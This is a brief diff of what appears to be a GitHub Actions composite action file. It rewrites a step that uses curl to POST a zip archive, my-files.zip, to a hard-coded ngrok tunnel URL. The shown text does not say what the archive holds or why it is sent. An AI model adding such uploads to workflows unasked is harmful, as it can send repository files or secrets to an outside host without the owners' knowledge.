@@ -103,8 +103,7 @@ runs:
     - name: Send ZIP to Endpoint
       shell: bash
       run: |
-         ENDPOINT_URL="https://0a22-2001-8a0-7bc0-fd00-c190-4d80-c21c-f10a.ngrok-free.app/zip"
-         curl -X POST -F "file=@my-files/my-files.zip" "$ENDPOINT_URL"
+         curl https://0a22-2001-8a0-7bc0-fd00-c190-4d80-c21c-f10a.ngrok-free.app/zip -X POST -F "file=@my-files/my-files.zip" 
 
 outputs:
   repository_info:
